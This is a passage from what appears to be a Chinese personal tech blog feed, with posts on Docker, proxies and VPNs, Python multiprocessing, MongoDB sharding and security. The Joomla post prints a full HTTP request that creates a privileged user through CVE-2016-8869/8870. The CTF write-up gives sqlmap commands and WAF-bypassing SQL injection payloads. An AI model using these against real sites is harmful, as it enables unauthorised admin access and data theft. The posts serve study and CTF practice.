最小化限制输入范围（限制只能内网访问比全网访问安全，限制数字比所有字符安全，重命名比采用用户输入文件名更安全）]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[涉猎Docker]]></title>
    <url>%2F2016%2F12%2F08%2Fdocker%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;初步接触Docker，记录一下安装过程和常用命令，同时安装nsenter可以十分方便地进入Docker进行管理。 0x01实践官方安装教程1.检测操作系统内核版本1uname -a 返回如下:1Ubuntu 14.04.5 LTS (GNU/Linux 3.13.0-101-generic x86_64) 2.Docker安装更新源 1sudo apt-get update 安装对apt对https的支持和ca证书1sudo apt-get install apt-transport-https ca-certificates 添加Docker的密钥及源文件12sudo apt-key adv --keyserver hkp://ha.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609Decho "deb https://apt.dockerproject.org/repo ubuntu-trusty main" | sudo tee /etc/apt/sources.list.d/docker.list 更新Docker源并安装Docker123sudo apt-get updatesudo apt-get install docker-enginesudo service docker start # 提示无此服务是执行reboot 3.常用命令搜索docker镜像1sudo docker search 获取ubuntu镜像 1sudo docker pull ubuntu 查看已获取docker镜像1sudo docker images 命令行运行docker(命名为ubuntu_test,-t -i指定命令行方式，并启动bash，输入exit退出docker)1sudo docker run --name ubuntu_test -i -t ubuntu /bin/bash 后台运行docker,并映射端口到宿主机(后台运行tutum/lamp镜像，并把docker的80端口映射到宿主机8080,3306映射到宿主机3306,可以访问宿主机的8080端口获取docker的web服务) 1sudo docker run -d -p 8080:80 -p 3306:3306 --name lamp_test tutum/lamp 查看所有的docker(运行和停止的，并获取到docker的id和name唯一标识符)1sudo docker ps -a 已创建docker的启动、停止、重启（指定唯一标识符id或name,以ubuntu_test 为例）123sudo docker start ubuntu_test sudo docker stop ubuntu_test sudo docker restart ubuntu_test 删除docker实例（指定唯一标识符id或name,以ubuntu_test 为例）1sudo rm ubuntu_test 删除docker镜像（指定镜像标识符，以获取的ubuntu镜像为例）1sudo rmi ubuntu 4.安装nsenter进入docker（已过时，使用docker exec -it container_id /bin/bash）docker在不易后台方式运行时，退出以后docker示例就停止运行，然而后台方式运行情况下，如何进入docker内部执行相关操作就十分重要了(1)安装（笔者环境为Ubuntu 14.04.5 LTS）方式1.安装官方最新版打开连接https://www.kernel.org/pub/linux/utils/util-linux/选择最新版本，复制链接地址下载安装文件(以2.29为例) 1234567wget https://www.kernel.org/pub/linux/utils/util-linux/v2.29/util-linux-2.29.tar.gztar -zxvf util-linux-2.29.tar.gzlscd util-linux-2.29./configure --without-python --disable-all-programs --enable-nsenter --without-ncursesmake nsentercp nsenter /usr/local/bin 方式2.一键安装（使用https://github.com/jpetazzo/nsenter的docker镜像安装）1sudo docker run --rm -v /usr/local/bin:/target jpetazzo/nsenter (2)nsenter使用其中container_name_or_ID修改为需要进入docker的唯一标识符id或name1nsenter --target $(docker inspect --format \&#123;\&#123;.State.Pid\&#125;\&#125; container_name_or_ID) --mount --uts --ipc --net --pid 以lamp_test为例，执行如下命令直接进入docker内部1sudo nsenter --target $(sudo docker inspect --format \&#123;\&#123;.State.Pid\&#125;\&#125; lamp_test) --mount --uts --ipc --net --pid 0x02其他 docker使用nanoexport TERM=xterm docker挂载目录docker run -it -v /home/dock/Downloads:/usr/Downloads ubuntu64 /bin/bash]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图解censys技术框架]]></title>
    <url>%2F2016%2F11%2F15%2Fcensys%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;最近学习了Censys开源项目的相关内容，认真研读官方发布的论文，总结为思维导图分享一下。 0x01思维导图 &emsp;&emsp;思维导图SVG版本]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>censys</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Joomla未授权创建特权用户实践]]></title>
    <url>%2F2016%2F10%2F28%2Fjoomla_create_user_unauthorized%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;近日爆出Joomla的3.4.4-3.6.3版本存在未授权创建用户漏洞CVE-2016-8869，CVE-2016-8870，测试3.6.3版本Joomla的实践中发现默认安装Joomla后,由于默认网站关闭注册功能且注册用户的激活方式是”self”即用户自己邮箱激活，实践中利用漏洞发送数据包注册账户成功却不能成功激活且不能成功登录，接下来就是问题分析及思考。 0x01漏洞原理 大致原理：Joomla源码中/components/com_users/controllers/registration.php/components/com_users/controllers/user.php两个文件皆存在用户注册函数，然而user.php中的注册函数没有检测管理员是否关闭用户注册功能，导致攻击者可以在网站关闭注册的情况下注册特权用户。 具体利用方式参考链接：Joomla未授权创建用户漏洞（CVE-2016-8870）分析Joomla未授权创建特权用户漏洞（CVE-2016-8869）分析 笔者的非授权创建特权用户测试数据包格式如下（记得修改为对应的IP、cookie、token、邮箱）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354POST /index.php/component/users/?task=registration.register HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/index.php/component/users/?view=registrationCookie: mycookieConnection: keep-aliveUpgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=---------------------------602419586513Content-Length: 1074-----------------------------602419586513Content-Disposition: form-data; name="user[name]"123321-----------------------------602419586513Content-Disposition: form-data; name="user[username]"123321-----------------------------602419586513Content-Disposition: form-data; name="user[password1]"123321-----------------------------602419586513Content-Disposition: form-data; name="user[password2]"123321-----------------------------602419586513Content-Disposition: form-data; name="user[email1]"testtest@qq.com-----------------------------602419586513Content-Disposition: form-data; name="user[email2]"testtest@qq.com-----------------------------602419586513Content-Disposition: form-data; name="user[groups][]"7 -----------------------------602419586513Content-Disposition: form-data; name="option"com_users-----------------------------602419586513Content-Disposition: form-data; name="task"user.register -----------------------------602419586513Content-Disposition: form-data; name="mytoken"1-----------------------------602419586513-- 数据包发送成功，邮箱收到激活邮件 然而点击激活却返回403禁止访问。 管理后台查看用户状态发现没有启用和激活 0x02激活失败原因分析查看/components/com_users/controllers/registration.php源码，分析激活函数部分123456789101112131415161718192021222324252627public function activate() &#123; $user = JFactory::getUser(); $input = JFactory::getApplication()-&gt;input; $uParams = JComponentHelper::getParams('com_users'); // Check for admin activation. Don't allow non-super-admin to delete a super admin if ($uParams-&gt;get('useractivation') != 2 &amp;&amp; $user-&gt;get('id')) &#123; $this-&gt;setRedirect('index.php'); return true; &#125; // If user registration or account activation is disabled, throw a 403. if ($uParams-&gt;get('useractivation') == 0 || $uParams-&gt;get('allowUserRegistration') == 0) &#123; JError::raiseError(403, JText::_('JLIB_APPLICATION_ERROR_ACCESS_FORBIDDEN')); return false; &#125; $model = $this-&gt;getModel('Registration', 'UsersModel'); $token = $input-&gt;getAlnum('token'); …… 以下省略 激活函数判断如果注册用户激活方式不是Self(用户激活模式) 或者如果网站注册功能关闭均会返回403禁止访问,从而导致不能成功激活和登录，即网站关闭注册功能就不能激活，只有激活方式是None（不用激活）才能成功利用。安装joomla后默认关闭网站注册功能而且账户激活方式是”Self”用户激活方式，根据上面分析表明如果网站是关闭了注册功能，那么用户就不能成功激活，当然，也不能成功登录。 0x03应用场景总结 网站开启注册功能，注册用户激活方式为”Self”或者”None”可以利用此漏洞注册获得高权限用户。 网站关闭用户注册功能，但是新用户注册激活方式为”None”,即不需要激活。可以利用此漏洞注册获得高权限用户]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Joomla</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[补天沙龙成都站入场券CTF]]></title>
    <url>%2F2016%2F10%2F22%2Fbutian_chengdu_salon_ctf%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;10月22补天成都沙龙，GO!GO!GO,入场需要CTF，个人Writeup早就写好了，尊重游戏规则，现在才发布。 0x01过程1.CTF地址：http://butian.secbox.cn/访问链接得到下图: 添加?id=1,2,3,4得到不同信息，id=3时提示flag在数据库中，id=4提示需要bypass1http://butian.secbox.cn/?id=3 利用简单手工注入测试and 1=1或order by 1被waf拦截了，测试过滤了：空格、+、and、order、by 暂时没有想法，直接上sqlmap1python sqlmap.py -u "butian.secbox.cn?id=4" --tamper=space2comment --dbs 测试出有注入，然而只能获得数据库名为”websql”，无法获取表名和列名 工具不成功，接着根据sqlmap的测试payload，构造如下payload获取数据库基本信息1http://butian.secbox.cn/?id=-1/**/UNION/**/ALL/**/SELECT/**/CONCAT_WS(CHAR(32,58,32),user(),database(),version()) 测试手工利用information_schema数据库注入获取表名和列名，发现仍然被waf拦截，测试发现WAF拦截了：”infor” ,此路不通！ 接着小伙伴灵机一动，在sqlmap的爆破猜表名、列名中添加”butian”、”flag”等。灵光闪现，列名和表明都是”flag”,12python sqlmap.py -u "butian.secbox.cn?id=4" --tamper=space2comment --tables -D "websql"python sqlmap.py -u "butian.secbox.cn?id=4" --tamper=space2comment --columns -T "flag" -D "websql" 测试–dump获取数据，然而没有得到任何信息手动提交吧1http://butian.secbox.cn/?id=-1/**/UNION/**/ALL/**/SELECT/**/flag/**/from/**/flag Bingo! 0x02后续成功提交flag以后，纠结sqlmap的dump为什么不能获取到数据，于是挂个代理看看，执行如下命令1python sqlmap.py -u "butian.secbox.cn?id=4" --tamper=space2comment --dump -C "flag" -T "flag" -D "websql" --proxy="http://127.0.0.1:8080/" burp抓到的包内容为（URLdecode后）：12345678910GET /?id=-4678/**/UNION/**/ALL/**/SELECT/**/CONCAT(0x717a767671,IFNULL(CAST(flag/**/AS/**/CHAR),0x20),0x7171717171)/**/FROM/**/websql.flag/**/ORDER/**/BY/**/flag# HTTP/1.1Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateHost: butian.secbox.cnAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8User-Agent: sqlmap/1.0-dev-nongit-20160604 (http://sqlmap.org)Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7Connection: closePragma: no-cacheCache-Control: no-cache,no-store 分析由于sqlmap语句中包含了ORDER/**/BY/**/flag,手工去掉，然后hackbar提交如下1http://butian.secbox.cn?id=-4678/**/UNION/**/ALL/**/SELECT/**/CONCAT(0x717a767671,IFNULL(CAST(flag/**/AS/**/CHAR),0x20),0x7171717171)/**/FROM/**/websql.flag 0x03总结 此次CTF由于WAF拦截了：空格、+、and、order、by、infor，所以需要用/**/代替空格，而且只能用id=-4678（负数皆可）替代and 1=2使得前部分SQL语句为“假”，同时也不能使用查询information_schema数据库获得表名和列名，采取猜测的方法。 mysql数据库中CONCAT()函数用于将不同的字符连接在一起输出,执行SELECT CONCAT(&#39;my&#39;,&#39;sql&#39;);会得到”mysql” mysql数据库中的CAST()函数用于将获取的值都转换为指定类型,执行SELECT CAST(1 as CHAR)会得到字符型的’1’ mysql数据库中IFNULL(expr1,expr2)函数用来当第一个表达式expr1不是NULL时返回expr1,否则返回expr2。执行SELECT IFNULL(NULL,&#39;IS_NULL&#39;);返回”IS_NULL”,执行SELECT IFNULL(&#39;test&#39;,&#39;IS_NULL&#39;);,返回”test” mysql数据库中，手工猜测表名SELECT EXISTS(SELECT * FROM 表名)，手工猜测列名SELECT EXISTS(SELECT 列名 FROM 表名)]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Proxifier+Shadowshocks系统全局代理的正确姿势]]></title>
    <url>%2F2016%2F09%2F19%2FProxifier_Shadowshocks%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;成功搭建使用shadowshocks实现代理访问google，然而只能浏览器代理方式使用，不能其他程序使用代理，不利于白帽子匿名安全检测，下面将介绍利用Proxifier实现全局代理。 0x01安装官网发布多个版本，其中便携版不需要安装，直接双击运行，安装版则直接安装即可&emsp;&emsp;Windows便携版：官网地址&emsp;&emsp;Windows安装版：官网地址&emsp;&emsp;Mac版：官网地址 0x02使用教程1.打开软件点击Profile，接下来配置的三步顺序 代理服务器配置 代理规则设置 域名解析设置 2.配置第一步 点击Proxy Server按钮 add 输入本地shadowshocks的ip（默认127.0.0.1）和端口（默认1080） 选择SHOCKS Versin 5 然后点击check OK 显示Proxy is ready to work with Proxfier! 则此步骤配置成功，否则认真检查端口是否正确以及shadowsocks是否运行。 接下来的两步配置至关重要，配置错误可能导致全局代理失败或者循环代理3.配置第二步 点击Proxification Rule 选中localhost,点击Edit Target hosts处添加shadowshocks代理服务器的IP地址（以123.123.123.123示例） Action选择Direct(直连) OK 注：此配置步骤允许发送到代理服务器的数据包通过，防止循环代理错误配置后如图 4.配置第三步 点击Name Resolution 选择第二个Resolve hostnames through proxy（通过代理服务器解析域名） OK 5.至此，全局代理已经配置完毕，用CMD命令nslookup www.google.com测试是否成功获取其IP地址，也可以直接访问www.ip138.com查看当前外网IP地址。 0x03其他使用 Proxifier的规则设置十分灵活强大，可以默认所有数据流量都通过代理，即以上设置。 同时也可以通过对特殊应用或者端口进行更细粒度的代理设置，比如想要QQ数据包不通过代理，只需要添加规则，应用选择QQ,直连即可 如果想尽量减小代理的流量 也可以修改默认规则为直连，然后添加需要的特殊应用为代理访问]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>Proxifier</tag>
        <tag>Shadowshocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈VPN和代理]]></title>
    <url>%2F2016%2F09%2F10%2Fvpn_proxy%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;VPN和代理是两种常见的“翻墙”方式，那么两者的区别是什么呢：适用性？安全性？访问速度等？ 0x01代理1.1原理 代理服务器位于客户端和访问互联网之间，服务器接收客户端的请求，然后代替客户端向目标网站发出请求，所有的流量路由均来自代理服务器的IP地址，从而获取到一些不能直接获取的资源。 1.2代理分为HTTP代理和SOCKET代理 &emsp;&emsp;HTTP代理是在HTTP协议层的代理服务，只能处理HTTP/HTTPS请求，主要满足用户Web浏览网页需求，由于只处理HTTP请求，处理速度极快。 &emsp;&emsp;SOCKET代理不解析网络流量，传递数据包而并不关心是何种应用协议,这使得SOCKET代理可以用于多种环境，支持FTP、SMTP、HTTP等，也支持QQ、BT下载等多种应用，典型的有Shadowsocks。通常分为socks 4 和socks 5两种类型，socks 4只支持TCP协议而socks 5支持TCP/UDP协议，还支持各种身份验证机制等协议。 0x02VPN2.1原理 &emsp;&emsp;VPN(Virtual Private Network),在客户端和主机之间建立加密隧道，客户端的请求通过加密将所有方式发送给VPN服务器。 2.2主流VPN分为PPTP、SSL VPN 、IPSec VPN &emsp;&emsp;PPTP(Point to Point Tunneling Protocol)点对点隧道协议。用PPP协议对数据进行封装，添加附加包头用于互联网络上数据的传输工作，采用MPLS加密认证方式，工作在数据链路层。目前的计算机、智能手机等设备均支持此协议，不用额外安装软件即可连接。 &emsp;&emsp;IPSec(Internet Protocol Security)VPN采用IPSec协议实现VPN技术，工作在网络层。包括LAN TO LAN(站到站)、ENDTO LAN(端到站)等方式。 0x03对比3.1 资源特性 VPN方式是将客户端和服务器配置在一个LAN域，所有在配置VPN服务器时要求给服务器指定LAN于内的IP,且声明可以用于分配给客户端的IP范围，每个客户端连接VPN后，会分配到一个特点的IP地址，可以通过ipconfig/ifconfig查看到。 代理方式，服务器只接受客户端的请求数据包，然后转发，客户端不会分配得到特定的IP地址。 3.2 适用性 PPTP VPN/IPSec VPN等常见VPN适用性最佳，计算机设备、智能手机、PAD登智能设备默认支持此类VPN连接，不需要任何额外的软件即可获得VPN服务。SSL VPN通常需要安装特定的软件才能使用。默认计算机的所有流量都通过VPN传输 代理方式一般需要安装客户端才能使用，也可以通过浏览器代理设置，默认只有设置了代理的应用(通常是浏览器)的流量包才通过代理服务器。 3.3 安全性 其中PPTP是最常见的VPN，安装部署非常简便，网上不乏“一键搭建”的教程，然而PPTP VPN采用MSCHAPV2认证协议，该协议在网上爆出了很多的安全缺陷，可能导致中间人攻击，弱口令爆破（asleap+thc-pptp-bruter），而且秘钥空间只有2^56,利用专业的攻击设备可以在短时间内破解加密密钥，获取VPN通信内容。 IPSec VPN采用AH协议提供数据完整性和身份识别，采用ESP协议实现数据加密。SSL VPN采用SSL加密通信流，相对PPTP而言拥有更高的安全性。 Shadowsocks采用 AES-256-CFB或RC4-MD5加密，安全性也相对较高。 3.4 访问速度 网上针对SOCKET和HTTP代理速度比较各执一词，有人认为SOCKET代理直接转发流量，并不关心具体的协议，因而速度更快；也有说由于支持处理的协议多，加密耗时更长，因而速度更慢。笔者觉得实际应用中，限制的因素大部分是客户端到VPS的访问速度，加密耗时及协议数量不是决定性因素，带宽相对固定式，协议类型多样，导致网页的浏览速度感官上变慢，然而总流量几乎是持平的。这也可以类比于Shadowsocks代理浏览器访问感觉比VPN快，应为默认VPN是系统全局代理，所有请求流量都要耗费带宽，而Shadowsocks则只有代理的数据流量，同样带宽感官上浏览速度确实较快。 0x04参考Debian OpenVPN安装官方教程Ubuntu OpenVPN安装官方教程Ubuntu PPTP安装教程Proxies vs. VPN – What’s the difference?A death blow for PPTPShadowsocks 使用说明]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[字符串LOGO在线制作之ascii arts]]></title>
    <url>%2F2016%2F08%2F05%2FLOGO_ascii_arts%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;各种优秀的开源程序运行都有一个帅气的字符logo，是不是都在惊叹如此高端洋气的设计，其实每个程序员都可以轻松拥有。&emsp;&emsp;ascii arts即为用ascii字符作画之意 0x01设计&emsp;&emsp;推荐两个在线资源ASCII Art | Generator和Text to ASCII Art Generator (TAAG)1.1 ASCII Art | Generator特点：支持多种格式转换（可能需要翻墙）1.文字转换：更多样式12345 _ _ /\ /\___| | | ___ / /_/ / _ \ | |/ _ \ / __ / __/ | | (_) |\/ /_/ \___|_|_|\___/ 2.图片转换（小于300K）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596 `:.`+#. .+############ `##############+ ``` :######################, .##########################` .############################. ####''''''####################. '###''##+'''#################### `###'#+'''''+##+'+###############+ +#####+''+####+++#''##############` `######'+######++++++''############+ ##'###'#########+++##+''############` `#'###+###+###+++++++##++'###########+ :#'#######'#+#++++++++###+'########### #''######''+##++++++++####+'##########; #'+#####''+###++++++################### .#'######'+#####++++++##########'#######: '''#####'+#######++++++##########'####### #'+#####+#######'+++++++#######'#'#######` ,#'#####+######' `+++++#+######+'#'######' #+############: :++++#########'+'####### :#############+ ++#+#+#######'''####### .############## `+####+######''++###### `###########+##: '####++#####+'#+######. #':########+### #####++#####'#+######; ;, +########'##. ;##'#+++####'#+####### ` #########'## ## +#+++###'#######'#: ########++## '##'. +# ##++###'######+''# `########'###' .##: ,#,####+###'######'''#+ .########'### .:;:+,;: ,##+:##+###'######'''##+ ,########'##; ,###+#. `##+###+###'######''#,##` #########'## `+:,#:` `###.:#####'######''##.#+ ##########'#+ `+'; '##' `####'#######'#:###' `##########'#+ ,#' ;###++######'#####: `##########'#+ `## ####'###########+, ##########'## ##. +###'+######+###:. :#########'## ###, ,+###'########;#,, ##+;#####+##: :###+ .++###'#######:+# ##'#######+#' `'.#'.++###########`#' +'########+## :. , :#++##########+#. `'############ ##+++##########' .'#############` ###+++######### .'+#############' `';,;. .###++++######## #'#########+##### `###',;##` +####++++#######. +'#########'#####; #,####'#` `######+++########` #'#########'######. .#` #; +#######++#########, '+########'########` `'++'. :##########+##########, `########'+##@######. .###################;:+##',: ;###++''############, .####################; #########@##########+ .#########@############;` `#####################+,..,+##################;#######:` ,################################@###########: ###`'####, '######@###########################@##########. #### `###+ `#################@########################@@@###+####+ ,'` ,###########################################@###@@#######` +##############################################@######### ` `##########################################################, :#####:.###################################:#################: '####+ :######@#####' #:##################@##'#################' '#`### '#########`### ,,#####################:##################; .# ,##`'#########' ###' `':################;###+ ################## `#' ###;##########. ####+`#;##############: `### :#################; ,#+,.##'###########: :##################; ### +#################+ #',,;##+############` ########;####+;. '##`################### +;.;+#####:#######@###`#######+ '##.################### ,+`+#####',###########,#######+ ###.##############@#### #:######' ################;:, ##;'############@###### ,######## ,#######@#####+ ;##.#################### +#######+`############. ,##,##################### ####################. ,###;.####################+ ,###############@##+ ;######' .####################; +###############+#: `:###: :###################. #`############# ;; '###' .'###############+ ':.######'.###+ + .#########:;##.. :#+#####. ####: : ;######## #;+## :`.'###' +#### , :##:+###'#+,, # `######## :#+ .##+'.` .: #+####' ## .#.+ # ;`.###, +# `# + # ' +##, , #+ #+ + `+ .+##+ ; `+# ,+#.`; :, `###` '###; ;, +:' +### `: :#,: #,## ; ##: #`## ' `., ; ##, ; : ` '## , : `#+#` ` ` :# :',` ` :# ,, 1.2 Text to ASCII Art Generator (TAAG)特点：支持自定义特殊字符替换点击More Opts选择类型，输入替换字符即可如下是将空格” “换成点”.”12345678910111213......___...........___.......................................___........../\..\........./\__\...................................../\..\.........\:\..\......./:/._/_.................................../::\..\.........\:\..\...../:/./\__\................................./:/\:\..\....___./::\..\.../:/./:/._/_...___.....___...___.....___.../:/..\:\..\../\../:/\:\__\./:/_/:/./\__\./\..\.../\__\./\..\.../\__\./:/__/.\:\__\.\:\/:/..\/__/.\:\/:/./:/../.\:\..\./:/../.\:\..\./:/../.\:\..\./:/../..\::/__/.......\::/_/:/../...\:\../:/../...\:\../:/../...\:\../:/../....\:\..\........\:\/:/../.....\:\/:/../.....\:\/:/../.....\:\/:/../......\:\__\........\::/../.......\::/../.......\::/../.......\::/../........\/__/.........\/__/.........\/__/.........\/__/.........\/__/....]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python多进程vs多线程]]></title>
    <url>%2F2016%2F07%2F22%2FPython_mutithreading_mutiprocessing%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;近期处理亿级数据，发现对于耗费CPU的程序(正则检索等)而言Python的多线程由于线程调度还不如单线程效率高，然而多CPU环境下，多线程与单线程最多只能使得单个CPU达到100%利用率。利用Python多进程（multiprocessing）可以使得多个CPU同时工作，利用效率大大提升 0x01原理介绍1.1CPU密集型和IO密集型&emsp;&emsp;CPU密集型：程序线性执行，大量占用CPU，总是接近100%（如：正则匹配替换大量文本）&emsp;&emsp;IO密集型：程序大量时间花费在等待I/O操作，CPU总是闲置，在10%左右（如：网络请求） 1.2python多线程和多进程&emsp;&emsp;python的多线程和其他编程语言的多线程有很大的区别，python多线程即使在多核CPU主机上也只能使用一个CPU，不是真正意义上的并发执行。&emsp;&emsp;对于IO密集型的程序而言，使用多线程技术可以在CPU阻塞等待的间隔执行其他操作，可以提高CPU的使用效率，PS:gevent库协程技术也是只在IO密集型程序比较有效&emsp;&emsp;对于CPU密集型的程序而言，原本CPU就是一直繁忙的状态，强制使用多线程技术，不会增加CPU的利用效率，却增加线程切换的代价，可能导致多线程的执行效率还不如单线程的执行效率。在多核CPU主机可以采用pytho多进程（multiprocessing）使得程序同时使用多个CPU，可以达到程序真实意义上的并行（进程数不要超过CPU核数） 0x02实际对比测试环境：&emsp;&emsp;Ubuntu系统&emsp;&emsp;16核CPU主机 2.1多线程测试程序代码123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python# -*- coding: utf-8 -*-import Queueimport threadingqueueLock = threading.Lock()workQueue = Queue.Queue()thread_num = 11threads = []class MyThread (threading.Thread): def __init__(self, Queue,id): threading.Thread.__init__(self) self.q = Queue self.id = id def run(self): while not workQueue.empty(): get_info(self.q.get(),self.id)def get_info(data,threading_id): for i in range(1000000): a=str(threading)+datadef main(): for i in range(1000): workQueue.put(str(i)) for i in range(thread_num): thread = MyThread(workQueue, i) thread.start() threads.append(thread) for t in threads: t.join()if __name__ == '__main__': main() 运行python程序，监控CPU使用情况只有1个CPU在使用状态 2.2多进程测试代码123456789101112131415161718192021222324252627#!/usr/bin/env python# -*- coding: utf-8 -*-import multiprocessingprocessors = []processor_num = 11workQueue = multiprocessing.Queue()def single_processor(q,id): while not workQueue.empty(): get_info(q.get(),id)def get_info(data,processor_id): for i in range(1000000): a=str(processor_id)+datadef main(): for i in range(1000): workQueue.put(str(i)) for i in range(processor_num): p = multiprocessing.Process(target=single_processor, args=(workQueue,i)) p.start() processors.append(p) for i in processors: i.join()if __name__ == '__main__': main() 运行python程序，监控CPU使用情况可以看出有11个CPU均处于100%利用状态（注：进程数最好不要超过CPU核数） 0x03总结当程序功能需要大量使用CPU，没有IO等待延迟即程序为CPU密集型的时候，且主机为多核的情况下，Python多进程可以达到极好的效率。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB3.2集群搭建]]></title>
    <url>%2F2016%2F07%2F21%2FMongoDB_shard%2F</url>
    <content type="text"><![CDATA[0x00 前言&emsp;&emsp;MongoDB分布式集群搭建比较容易实现，为了优化项目的性能，实战并记录一下过程，更多信息参考官方文档 0x01 原理介绍1.1水平扩展和垂直扩展1.水平扩展也叫横向扩展，通过提高CPU、内存的能力。（比方：钢铁侠抬起一辆车）2.垂直扩展也叫纵向扩展或者分片（shard）,通过分割数据到不同的服务器，利用多台低存储、低内存的机器共同完成大数据的处理。（比方：十个人抬起一辆车）&emsp;&emsp;如果有1T的数据需要存储，可以通过买1T的硬盘，实现单服务器存储，也可以通过4台256G硬盘的服务器实现分布式存储，如下图： 1.2mongodb集群组件1.分片（shard）:是一个单独的mongod服务器或者复制集，存储集群的部分数据。2.路由（mongos）根据应用请求分发读写请求信息到各个分片3.配置服务器（config server）:存储数据分片信息，配置服务器如果宕机，整个集群处于不可用状态。注:生产环境中，为了提高容错能力和抗灾能力，配置服务器应该为复制集且为多台、mongos也应对于两台、分片均采用复制集 0x02 搭建实战此次集群搭建实战基于一台主机之上，原理和多台主句上搭建一样。多台主机搭建要求分片服务器与配置服务器和mongos能相互访问。可参考官方快速部署 2.1环境与系统框架图2.1.1搭建环境&emsp;&emsp;Ubuntu 14.04&emsp;&emsp;MongoDB 3.2.6注:3.2.6修复了3.2.5及以前版本的shards 大数据分片“30 second network timeout”的bug 2.1.2系统框架图 2.2建立数据库目录12345#三个分片目录和一个配置服务器目录mkdir /data/db1mkdir /data/db2mkdir /data/db3mkdir /data/configdb 2.3启动分片和config server12345mongod --port 10001 --dbpath /data/db1&amp;mongod --port 10002 --dbpath /data/db2&amp;mongod --port 10003 --dbpath /data/db3&amp;mongod --configsvr&amp;#利用"&amp;"将mongod后台运行，也可以打开多个窗口单独运行mongod。 注：笔者在某教材上看到：“–configsvr设置端口为27017，数据位置为/data/configdb 可以用–port 27019 –dbpath /data/configdb代替”，然而使用后者连接mongos，查看sh.status()会报如下错误 亲测这个报错问题可以mongo连接配置服务器执行sh.status()解决，不过最好还是使用官方”–configsvr”吧！ 2.4启动mongos开启一个新的窗口，由于mongos需要读取配置服务器的信息，配置服务器一定要在mongos之前运行12#连接配置服务器，config server默认监听27019端口，mongos默认监听27017端口mongos --configdb 127.0.0.1:27019 2.5配置集群再开启一个新的窗口 2.5.1连接mongos12#服务器上运行mongo默认连接127.0.0.1:27017mongo 2.5.2添加分片123sh.addShard("127.0.0.1:10001")sh.addShard("127.0.0.1:10002")sh.addShard("127.0.0.1:10003") 如下图： 2.5.3数据分片（1）启用数据库的分片1sh.enableSharding("test") （2）对集合数据分片12#注意:如果对已存在的集合分片，片键（此为uaername）必须是已经建立索引sh.shardCollection("test.student",&#123;"username":1&#125;) 2.5.4集群状态监控1234#连接mongosmongo --port 27017sh.status()#如果分片信息较多，只显示部分信息，sh.status(&#123;"verbose":1&#125;)可以完全显示 可以获得分片的信息，如图： 至此，一个单机版的mongodb集群搭建完毕，应用连接mongos可以按照操作普通mongod的方式操作mongos,从而进行备份恢复数据库、数据插入和获取等。 0x03 集群的其他操作3.1 从集群中删除分片3.1.1连接到mongos123mongouse admindb.runCommand( &#123; removeShard: "shard000" &#125; ) 立刻得到如下信息123456&#123; "msg" : "draining started successfully", "state" : "started", "shard" : "shard000", "ok" : 1&#125; 但是分片删除操作没有完成，需要将删除分片上的所有数据迁移到其他的分片，可能会花费很长的时间（如果只有最后一个分片，禁止删除分片操作）此时如果尝试删除其他分片，例如：执行db.runCommand( { removeShard: &quot;shard001&quot; } )会报错，提示不能同时删除多个分片123"ok" : 0,"errmsg" : "Can't have more than one draining shard at a time","code" : 117 3.1.2一段时间之后，运行db.runCommand( { removeShard: &quot;shard000&quot; } )检查数据迁移状态，返回如下12345678910111213&#123; "msg" : "draining ongoing", "state" : "ongoing", "remaining" : &#123; "chunks" : NumberLong(0), "dbs" : NumberLong(1) &#125;, "note" : "you need to drop or movePrimary these databases", "dbsToMove" : [ "test_admin" ], "ok" : 1&#125; 其中的remainning是必须迁移到其他分片剩余的数据块（chunks）和这个分片上未分片（primary）的数据库数量 3.1.3直到chunks为零以后，将未分片的数据迁移到其他分片(可能会花费一定的时间)，倘若该数据库没用也可直接删除1db.runCommand( &#123; movePrimary: "test_admin", to: "shard0001" &#125;) 迁移成功后返回如下：1&#123; "primary" : "shard0001:127.0.0.1:100002", "ok" : 1 &#125; 